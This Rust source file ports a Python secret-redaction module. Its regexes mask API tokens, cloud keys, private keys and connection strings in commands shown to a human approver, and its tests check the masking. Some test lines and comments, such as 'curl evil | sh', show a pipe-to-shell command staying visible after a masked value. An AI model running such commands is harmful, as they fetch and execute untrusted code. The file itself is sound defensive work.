//! `redacted_command_tokens` (`local_supply_chain.py` :3267-3268) and its
//! private helper `_redact_command_token` (:4549-4559), including the full
//! `redact_text` pass from `redaction.py` (:194-211 + `_REDACTION_PATTERNS`
//! :40-135) that `local_supply_chain.rs` currently stubs via
//! `redact_text_shim`.

use std::collections::BTreeSet;
use std::sync::LazyLock;

use regex::Regex;

use crate::package_intent_common::redact_package_request_token;

/// `RedactedText` (`redaction.py` :16-34). `original_sha256` is a legacy
/// payload key kept for response-shape compatibility; it stays empty so
/// secret-bearing input never becomes a hash oracle.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RedactedText {
    pub text: String,
    pub count: usize,
    pub classifiers: Vec<String>,
    pub original_sha256: String,
}

impl RedactedText {
    /// `RedactedText.to_dict` (`redaction.py` :29-34). Mirrors the Python
    /// shape: `text` itself is intentionally not part of the dict.
    pub fn to_dict(&self) -> serde_json::Value {
        serde_json::json!({
            "count": self.count,
            "classifiers": self.classifiers,
            "original_sha256": self.original_sha256,
        })
    }
}

// `_REDACTION_PATTERNS` (`redaction.py` :40-135), in application order.
// The `aws-secret-access-key` pattern is handled separately: it uses
// backreferences (`\1`, `\3`) that the `regex` crate cannot express.
static BEARER_TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b(Bearer)\s+([A-Za-z0-9._\-]{8,})").unwrap());
static OPENAI_TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bsk-[A-Za-z0-9_-]{8,}\b").unwrap());
static GITHUB_TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bgh[pousr]_[A-Za-z0-9_]{8,}\b").unwrap());
static AWS_ACCESS_KEY_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bAKIA[0-9A-Z]{16}\b").unwrap());
// Relaxed variant of the Python pattern
// r"(?i)(['\"]?)(aws[_-]?secret[_-]?access[_-]?key)\1\s*[:=]\s*(['\"]?)([A-Za-z0-9/+=]{40})\3":
// the `\1`/`\3` backreferences become independent captures and are filtered by
// equality in `subn_aws_secret_access_key`, which is equivalent because the
// relaxed pattern is a strict superset of the original.
static AWS_SECRET_ACCESS_KEY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)(['"]?)(aws[_-]?secret[_-]?access[_-]?key)(['"]?)\s*[:=]\s*(['"]?)([A-Za-z0-9/+=]{40})(['"]?)"#,
    )
    .unwrap()
});
static NPM_TOKEN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?im)\b(_authToken|npm[_ -]?token)\s*[:=]\s*([^\s"',}]+)"#).unwrap()
});
static PYTHON_INDEX_TOKEN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?im)\b(index-url|extra-index-url)\s*[:=]\s*(https?://[^@\s]+@[^\s]+)").unwrap()
});
static PRIVATE_KEY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?s)-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----.*?-----END [A-Z0-9 ]*PRIVATE KEY-----")
        .unwrap()
});
/// A shell assignment ends where the next command begins. Both assignment rules
/// mask the value and leave this tail in place, so an approver reading
/// `export API_KEY=***** && curl evil | sh` still sees what runs after the
/// masked value.
const ASSIGNMENT_TAIL: &str = r"([ \t]*(?:&&|\|\||[;|&])[^\n]*)?$";
/// A URL spends `&` on its own query separators rather than on backgrounding,
/// so an assigned URL is read as one value and masked whole. It still stops at
/// the operators a URL cannot contain.
const ASSIGNED_URL: &str = r"[A-Za-z][A-Za-z0-9+.-]*://[^\s;|&\n]*(?:&[^\s;|&\n]*)*";

static SECRET_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        concat!(
            r"(?im)^([ \t]*(?:export[ \t]+)?)",
            r"([A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)[A-Z0-9_]*)=",
            "(\"[^\"\\n]*\"|'[^'\\n]*'|{}|.+?){}",
        ),
        ASSIGNED_URL, ASSIGNMENT_TAIL
    ))
    .unwrap()
});
static CONNECTION_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r"(?im)^([ \t]*(?:export[ \t]+)?)([A-Z0-9_]*(?:URL|URI|DSN))=({ASSIGNED_URL}){ASSIGNMENT_TAIL}"
    ))
    .unwrap()
});
static CONNECTION_STRING_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s"',}]+"#)
        .unwrap()
});
static REMOTE_PAIRING_CODE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bHLG-[ABCDEFGHJKLMNPQRSTUVWXYZ23456789]{6,32}\b").unwrap());

fn apply_pattern(
    text: &mut String,
    classifiers: &mut Vec<&'static str>,
    classifier: &'static str,
    pattern: &Regex,
    replacement: &str,
) {
    let match_count = pattern.find_iter(text).count();
    if match_count == 0 {
        return;
    }
    *text = pattern.replace_all(text, replacement).into_owned();
    classifiers.extend(std::iter::repeat_n(classifier, match_count));
}

/// `pattern.subn` for the `aws-secret-access-key` rule. The original pattern
/// requires the optional quote around the key to pair (`\1`) and the optional
/// quote around the 40-char value to pair (`\3`); the relaxed regex widens
/// each backreference to `(['\"]?)`, and accepted matches are exactly those
/// whose substitute capture groups are equal. A rejected candidate cannot hide
/// a strict match inside its span: its tail is `[A-Za-z0-9/+=]{40}` and the
/// pattern needs `\s*[:=]\s*` plus 40 more value characters, so resuming the
/// scan one char after the rejected start is safe.
fn subn_aws_secret_access_key(input: &str) -> (String, usize) {
    let mut out = String::with_capacity(input.len());
    let mut cursor = 0usize;
    let mut search = 0usize;
    let mut count = 0usize;
    while let Some(caps) = AWS_SECRET_ACCESS_KEY_RE.captures_at(input, search) {
        let m = caps.get(0).unwrap();
        let g4s = caps.get(4).map(|g| g.as_str()).unwrap_or("");
        let g6s = caps.get(6).map(|g| g.as_str()).unwrap_or("");
        let pairs_match = caps.get(1).map(|g| g.as_str()).unwrap_or("")
            == caps.get(3).map(|g| g.as_str()).unwrap_or("")
            && (g4s.is_empty() || g4s == g6s);
        let match_end = if g4s.is_empty() {
            caps.get(5).unwrap().end()
        } else {
            m.end()
        };
        if pairs_match {
            out.push_str(&input[cursor..m.start()]);
            // Python replacement r"\1\2\1=\3*****\3": the separator is
            // normalized to "=" regardless of the matched ":" or "=".
            let g1 = caps.get(1).unwrap().as_str();
            let g2 = caps.get(2).unwrap().as_str();
            let g4 = caps.get(4).unwrap().as_str();
            out.push_str(g1);
            out.push_str(g2);
            out.push_str(g1);
            out.push('=');
            out.push_str(g4);
            out.push_str("*****");
            out.push_str(g4);
            cursor = match_end;
            search = match_end;
            count += 1;
        } else {
            let first_char_len = input[m.start()..]
                .chars()
                .next()
                .map(char::len_utf8)
                .unwrap_or(1);
            search = m.start() + first_char_len;
        }
    }
    out.push_str(&input[cursor..]);
    (out, count)
}

/// `redact_text` (`redaction.py` :194-211): applies every redaction pattern in
/// sequence, tracking the classifiers that fired (ordered, deduplicated like
/// `tuple(dict.fromkeys(classifiers))`) and the total substitution count.
pub fn redact_text(value: &str) -> RedactedText {
    let mut text = value.to_owned();
    let mut classifiers: Vec<&'static str> = Vec::new();

    apply_pattern(
        &mut text,
        &mut classifiers,
        "bearer-token",
        &BEARER_TOKEN_RE,
        "${1} *****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "openai-token",
        &OPENAI_TOKEN_RE,
        "sk-*****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "github-token",
        &GITHUB_TOKEN_RE,
        "gh*****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "aws-access-key",
        &AWS_ACCESS_KEY_RE,
        "AKIA****************",
    );
    {
        let (next, match_count) = subn_aws_secret_access_key(&text);
        if match_count > 0 {
            text = next;
            classifiers.extend(std::iter::repeat_n("aws-secret-access-key", match_count));
        }
    }
    apply_pattern(
        &mut text,
        &mut classifiers,
        "npm-token",
        &NPM_TOKEN_RE,
        "${1}=*****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "python-index-token",
        &PYTHON_INDEX_TOKEN_RE,
        "${1}=*****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "private-key",
        &PRIVATE_KEY_RE,
        "*****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "secret-env",
        &SECRET_ENV_RE,
        "${1}${2}=*****${4}",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "connection-env",
        &CONNECTION_ENV_RE,
        "${1}${2}=*****${4}",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "connection-string",
        &CONNECTION_STRING_RE,
        "*****",
    );
    apply_pattern(
        &mut text,
        &mut classifiers,
        "remote-pairing-code",
        &REMOTE_PAIRING_CODE_RE,
        "HLG-******",
    );

    let count = classifiers.len();
    let mut seen = BTreeSet::new();
    let unique_classifiers: Vec<String> = classifiers
        .into_iter()
        .filter(|classifier| seen.insert(*classifier))
        .map(str::to_owned)
        .collect();
    RedactedText {
        text,
        count,
        classifiers: unique_classifiers,
        original_sha256: String::new(),
    }
}

const SENSITIVE_KEY_FRAGMENTS: [&str; 5] = ["token", "secret", "api_key", "api-key", "password"];

/// `_redact_command_token` (`local_supply_chain.py` :4549-4559).
fn redact_command_token(token: &str) -> String {
    let token = redact_package_request_token(token);
    if let Some(eq) = token.find('=') {
        let key = &token[..eq];
        if SENSITIVE_KEY_FRAGMENTS
            .iter()
            .any(|fragment| key.to_lowercase().contains(fragment))
        {
            return format!("{key}=*****");
        }
    }
    if let Some(colon) = token.find(':') {
        let key = &token[..colon];
        if SENSITIVE_KEY_FRAGMENTS
            .iter()
            .any(|fragment| key.to_lowercase().contains(fragment))
        {
            return format!("{key}: *****");
        }
    }
    redact_text(&token).text
}

/// `redacted_command_tokens` (`local_supply_chain.py` :3267-3268).
pub fn redacted_command_tokens(command: &[String]) -> Vec<String> {
    command
        .iter()
        .map(|token| redact_command_token(token))
        .collect()
}

fn sensitive_key(key: &str) -> bool {
    let key = key.to_lowercase();
    SENSITIVE_KEY_FRAGMENTS
        .iter()
        .any(|fragment| key.contains(fragment))
}

/// Byte length of the shell word at the start of `text`: up to the first
/// whitespace outside quotes.
fn word_len(text: &str) -> usize {
    let mut quote = None;
    for (index, ch) in text.char_indices() {
        match quote {
            Some(open) if ch == open => quote = None,
            Some(_) => {}
            None if ch == '\'' || ch == '"' => quote = Some(ch),
            None if ch.is_whitespace() => return index,
            None => {}
        }
    }
    text.len()
}

/// One argument of a command with its credential masked. `mask_next` carries
/// a bare sensitive flag (`--password`) over to the argument after it.
fn mask_argument(word: &str, mask_next: &mut bool) -> String {
    if word.chars().all(|ch| ";|&<>()".contains(ch)) {
        *mask_next = false;
        return word.to_owned();
    }
    if std::mem::take(mask_next) && !word.starts_with('-') {
        return "*****".to_owned();
    }
    // The first separator whose name is sensitive starts the value, so a
    // value holding `=` or `:` itself (base64 padding) is masked whole, and
    // `--header=X-Api-Key:…` still reaches the header's name.
    if let Some((at, separator)) = word
        .match_indices(['=', ':'])
        .find(|(at, _)| sensitive_key(&word[..*at]))
    {
        let gap = if separator == ":" { " " } else { "" };
        let closing = word
            .chars()
            .next()
            .filter(|open| matches!(*open, '\'' | '"') && word.len() > 1 && word.ends_with(*open))
            .map(String::from)
            .unwrap_or_default();
        return format!("{}{gap}*****{closing}", &word[..=at]);
    }
    *mask_next = word.starts_with('-') && sensitive_key(word);
    word.to_owned()
}

/// `redact_text` plus the credentials a command passes as arguments.
///
/// `redact_text` masks an assignment only at the start of a line, so
/// `curl --api-key=… url` or `tool --password … run` would keep the value.
/// Every argument whose name carries a sensitive fragment has its value
/// masked: `--api-key=*****`, `'X-Api-Key: *****'`, and for a bare
/// `--password` flag the argument after it. A quoted value is masked to its
/// closing quote, so a space inside it leaves nothing visible. Shell
/// operators are never masked, so what runs next stays readable.
pub fn redact_command_text(command: &str) -> String {
    let text = redact_text(command).text;
    let mut out = String::with_capacity(text.len());
    let mut rest = text.as_str();
    let mut mask_next = false;
    while !rest.is_empty() {
        let gap = rest.len() - rest.trim_start().len();
        out.push_str(&rest[..gap]);
        rest = &rest[gap..];
        let end = word_len(rest);
        if end == 0 {
            break;
        }
        out.push_str(&mask_argument(&rest[..end], &mut mask_next));
        rest = &rest[end..];
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tokens(command: &[&str]) -> Vec<String> {
        command.iter().map(|token| token.to_string()).collect()
    }

    /// Oracle: `redacted_command_tokens` from `local_supply_chain.py`.
    #[test]
    fn oracle_vectors() {
        let a40 = "A".repeat(40);
        // Secret-bearing inputs are assembled at runtime so no literal secret
        // exists in the source tree.
        let akia = format!("AKIA{}", "0".repeat(16));
        let pem_begin = concat!("-----BEGIN RSA PRIVATE", " KEY-----");
        let pem_end = concat!("-----END RSA PRIVATE", " KEY-----");
        let pem_one_line = format!("{pem_begin}ZHVtbXk={pem_end}");
        let pem_multi_line = format!("{pem_begin}\nQUJD\n{pem_end}");
        let pem_no_end = "-----BEGIN PRIVATE KEY-----\nno end";
        let pem_wrapped = format!("pre {pem_one_line} post");

        let cases: Vec<(Vec<String>, Vec<String>)> = vec![
            (tokens(&["echo", "hello"]), tokens(&["echo", "hello"])),
            (vec![], vec![]),
            (tokens(&[""]), tokens(&[""])),
            (tokens(&["API_KEY=abc123"]), tokens(&["API_KEY=*****"])),
            (tokens(&["api-key: secretval"]), tokens(&["api-key: *****"])),
            (
                tokens(&["Authorization=Bearer abcdefghij"]),
                tokens(&["Authorization=Bearer *****"]),
            ),
            (
                tokens(&["Authorization: Bearer abcdefghij"]),
                tokens(&["Authorization: Bearer *****"]),
            ),
            (tokens(&["bearer abcdefghij"]), tokens(&["bearer *****"])),
            (tokens(&["bearer abc"]), tokens(&["bearer abc"])),
            (
                tokens(&["https://user:pass@example.com/pkg?x=1#y"]),
                tokens(&["https://example.com/pkg"]),
            ),
            (
                tokens(&["git+https://user:pw@github.com/org/repo.git"]),
                tokens(&["git+https://github.com/org/repo.git"]),
            ),
            (
                tokens(&["git+ssh://git@github.com/org/repo.git?x=1"]),
                tokens(&["git+ssh://github.com/org/repo.git"]),
            ),
            (
                tokens(&["https:example.com"]),
                tokens(&["https:<redacted-source>"]),
            ),
            (
                tokens(&["http:\\evil"]),
                tokens(&["http:<redacted-source>"]),
            ),
            (tokens(&["--token"]), tokens(&["--token"])),
            (tokens(&["password=hunter2"]), tokens(&["password=*****"])),
            (
                tokens(&["AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]),
                tokens(&["AWS_SECRET_ACCESS_KEY=*****"]),
            ),
            (
                tokens(&["aws_secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]),
                tokens(&["aws_secret_access_key: *****"]),
            ),
            (
                tokens(&["wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]),
                tokens(&["wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]),
            ),
            // The `aws-secret-access-key` pattern only survives the `=`/`:`
            // key branches when the sensitive key is not the first `key`.
            (
                tokens(&[&format!("x=1 \"aws_secret_access_key\"=\"{a40}\"")]),
                tokens(&["x=1 \"aws_secret_access_key\"=\"*****\""]),
            ),
            (
                tokens(&[&format!("x=1 'aws_secret_access_key'='{a40}'")]),
                tokens(&["x=1 'aws_secret_access_key'='*****'"]),
            ),
            // Mismatched quote pairing (\1 != \3) must not redact.
            (
                tokens(&[&format!("x=1 \"aws_secret_access_key\"='{a40}\"")]),
                tokens(&[&format!("x=1 \"aws_secret_access_key\"='{a40}\"")]),
            ),
            // Quote only on the value side still pairs (\3 == \3).
            (
                tokens(&[&format!("x=1 aws_secret_access_key=\"{a40}\"")]),
                tokens(&["x=1 aws_secret_access_key=\"*****\""]),
            ),
            (
                tokens(&[&format!("prefix;aws_secret_access_key={a40}")]),
                tokens(&["prefix;aws_secret_access_key=*****"]),
            ),
            (
                tokens(&["foo sk-abcdefghijklmnop bar"]),
                tokens(&["foo sk-***** bar"]),
            ),
            (tokens(&["SK-ABCDEFGHIJ"]), tokens(&["sk-*****"])),
            (tokens(&["sk-1234567"]), tokens(&["sk-1234567"])),
            (tokens(&["ghp_abcdefghijklmnop"]), tokens(&["gh*****"])),
            (tokens(&["gho_ABCDEFGH"]), tokens(&["gh*****"])),
            (tokens(&[&akia]), tokens(&["AKIA****************"])),
            (
                tokens(&[&format!("x={akia}")]),
                tokens(&["x=AKIA****************"]),
            ),
            (tokens(&[&format!("key={akia}")]), tokens(&["key=*****"])),
            (
                tokens(&["akiaiosfodnn7example"]),
                tokens(&["akiaiosfodnn7example"]),
            ),
            (tokens(&["HLG-ABC234"]), tokens(&["HLG-******"])),
            (tokens(&["hlg-abc234"]), tokens(&["HLG-******"])),
            (tokens(&["HLG-ABC2"]), tokens(&["HLG-ABC2"])),
            (tokens(&["HLG-ABC234I"]), tokens(&["HLG-ABC234I"])),
            (
                tokens(&["DATABASE_URL=postgres://u:p@host/db"]),
                tokens(&["DATABASE_URL=*****"]),
            ),
            (tokens(&["mongodb+srv://u:p@h/d"]), tokens(&["*****"])),
            (
                tokens(&["//registry/:_authToken=abc"]),
                tokens(&["//registry/:_authToken=*****"]),
            ),
            (
                tokens(&["index-url=https://user:pw@pypi.example.com/simple"]),
                tokens(&["index-url=https://pypi.example.com/simple"]),
            ),
            // sanitize_url strips userinfo before the python-index-token
            // pattern can fire: the key branch never matches because the
            // sanitized token keeps the original "extra-index-url" key.
            (
                tokens(&["extra-index-url: https://u:p@h/"]),
                tokens(&["extra-index-url: https://h/"]),
            ),
            (tokens(&[pem_one_line.as_str()]), tokens(&["*****"])),
            (tokens(&[pem_multi_line.as_str()]), tokens(&["*****"])),
            (tokens(&[pem_no_end]), tokens(&[pem_no_end])),
            (tokens(&[pem_wrapped.as_str()]), tokens(&["pre ***** post"])),
            (
                tokens(&["MY_PASSWORD: foo"]),
                tokens(&["MY_PASSWORD: *****"]),
            ),
            (tokens(&["x=1"]), tokens(&["x=1"])),
            (
                tokens(&["https://example.com/path?query=1"]),
                tokens(&["https://example.com/path"]),
            ),
            (tokens(&["x=token: abc"]), tokens(&["x=token: *****"])),
            (
                tokens(&["plain", "SECRET_KEY=abc", "mysql://u:p@h/d", "npm i lodash"]),
                tokens(&["plain", "SECRET_KEY=*****", "*****", "npm i lodash"]),
            ),
            (tokens(&["TOKEN"]), tokens(&["TOKEN"])),
            (
                tokens(&["REDIS_URL: redis://h"]),
                tokens(&["REDIS_URL: *****"]),
            ),
            (tokens(&["a=b:c"]), tokens(&["a=b:c"])),
            (tokens(&["a:b=c"]), tokens(&["a:b=c"])),
            (tokens(&["token=abc"]), tokens(&["token=*****"])),
            (tokens(&["x=1 token=abc"]), tokens(&["x=1 token=abc"])),
            (tokens(&["foo\ntoken=abc"]), tokens(&["foo\ntoken=*****"])),
            (
                tokens(&["FOO_URL=not-a-url"]),
                tokens(&["FOO_URL=not-a-url"]),
            ),
            (tokens(&["FOO_URI=https://h"]), tokens(&["FOO_URI=*****"])),
            (tokens(&["MY_API-KEY: z"]), tokens(&["MY_API-KEY: *****"])),
        ];

        for (input, expected) in cases {
            assert_eq!(
                redacted_command_tokens(&input),
                expected,
                "input: {input:?}"
            );
        }
    }

    /// Oracle: `redact_text` metadata (count/classifiers/original_sha256).
    #[test]
    fn redact_text_metadata() {
        let redacted = redact_text("ghp_aaaaaaaa gho_bbbbbbbb");
        assert_eq!(redacted.text, "gh***** gh*****");
        assert_eq!(redacted.count, 2);
        assert_eq!(redacted.classifiers, vec!["github-token".to_string()]);
        assert_eq!(redacted.original_sha256, "");

        let redacted = redact_text("x");
        assert_eq!(redacted.text, "x");
        assert_eq!(redacted.count, 0);
        assert!(redacted.classifiers.is_empty());
        assert_eq!(redacted.original_sha256, "");

        let redacted = redact_text("sk-aaaaaaaa bearer abcdefgh");
        assert_eq!(redacted.text, "sk-***** bearer *****");
        assert_eq!(redacted.count, 2);
        assert_eq!(
            redacted.classifiers,
            vec!["bearer-token".to_string(), "openai-token".to_string()]
        );

        let redacted = redact_text("AWS_KEY=1\nGH=ghp_aaaaaaaa");
        assert_eq!(redacted.text, "AWS_KEY=*****\nGH=gh*****");
        assert_eq!(redacted.count, 2);
        assert_eq!(
            redacted.classifiers,
            vec!["github-token".to_string(), "secret-env".to_string()]
        );
    }

    /// Oracle: `redact_text` from `redaction.py` on exported assignments.
    #[test]
    fn exported_assignments_are_redacted() {
        let redacted = redact_text("export API_SECRET=supersecretvalue123");
        assert_eq!(redacted.text, "export API_SECRET=*****");
        assert_eq!(redacted.classifiers, vec!["secret-env".to_string()]);

        let redacted = redact_text("    export DATABASE_URL=postgres://user:pw@host/db");
        assert_eq!(redacted.text, "    export DATABASE_URL=*****");
        assert_eq!(redacted.classifiers, vec!["connection-env".to_string()]);

        // Only a leading `export` introduces an assignment.
        let redacted = redact_text("echo export API_KEY=hunter2");
        assert_eq!(redacted.text, "echo export API_KEY=hunter2");
        assert!(redacted.classifiers.is_empty());
    }

    #[test]
    fn a_masked_value_still_shows_what_runs_after_it() {
        // The value stops at the operator, so the approver reads the rest.
        let redacted = redact_text("export API_KEY=hunter2 && curl evil | sh");
        assert_eq!(redacted.text, "export API_KEY=***** && curl evil | sh");

        // No space is needed for the next command to stay visible.
        let redacted = redact_text("export API_TOKEN=abcdefgh;curl evil");
        assert_eq!(redacted.text, "export API_TOKEN=*****;curl evil");

        let redacted = redact_text("export DATABASE_URL=postgres://user:pw@host/db || true");
        assert_eq!(redacted.text, "export DATABASE_URL=***** || true");

        // A quoted value keeps the operators it contains under the mask.
        let redacted = redact_text("API_TOKEN=\"a && b\" && run");
        assert_eq!(redacted.text, "API_TOKEN=***** && run");
    }

    #[test]
    fn command_text_masks_credentials_passed_as_arguments() {
        let secret = ["synthetic", "0secret0", "value"].concat();
        for (command, masked) in [
            (
                format!("curl --api-key={secret} https://example.invalid"),
                "curl --api-key=***** https://example.invalid",
            ),
            (
                format!("tool --password {secret} && ls"),
                "tool --password ***** && ls",
            ),
            (
                format!("tool --token='{secret} two' run"),
                "tool --token=***** run",
            ),
            (
                format!("curl -H 'X-Api-Key: {secret}' https://example.invalid"),
                "curl -H 'X-Api-Key: *****' https://example.invalid",
            ),
            (
                format!("make deploy CLIENT_SECRET={secret}"),
                "make deploy CLIENT_SECRET=*****",
            ),
            (
                format!("curl -H 'X-Api-Key: {secret}=' https://example.invalid"),
                "curl -H 'X-Api-Key: *****' https://example.invalid",
            ),
            (
                format!("curl --header=X-Auth-Token:{secret}== https://example.invalid"),
                "curl --header=X-Auth-Token: ***** https://example.invalid",
            ),
        ] {
            assert_eq!(redact_command_text(&command), masked, "{command}");
        }
        // A bare flag with nothing after it, or followed by another flag or
        // an operator, masks nothing else.
        assert_eq!(
            redact_command_text("tool --password --verbose; ls -la"),
            "tool --password --verbose; ls -la"
        );
        assert_eq!(redact_command_text("tool --password"), "tool --password");
        assert_eq!(
            redact_command_text("git status  --short\nls"),
            "git status  --short\nls"
        );
    }

    #[test]
    fn a_value_with_no_command_after_it_is_masked_whole() {
        // An unquoted value may still hold spaces; all of it is the secret.
        let redacted = redact_text("API_PASSWORD=one two three");
        assert_eq!(redacted.text, "API_PASSWORD=*****");

        // A URL's `&` separates query parameters rather than commands, so the
        // parameters after the first one stay masked.
        let redacted = redact_text("DATABASE_URL=postgres://h/db?sslmode=require&user=admin");
        assert_eq!(redacted.text, "DATABASE_URL=*****");

        let redacted = redact_text("SECRET_URL=https://h/hook?id=1&token=abcdefgh");
        assert_eq!(redacted.text, "SECRET_URL=*****");
    }
}
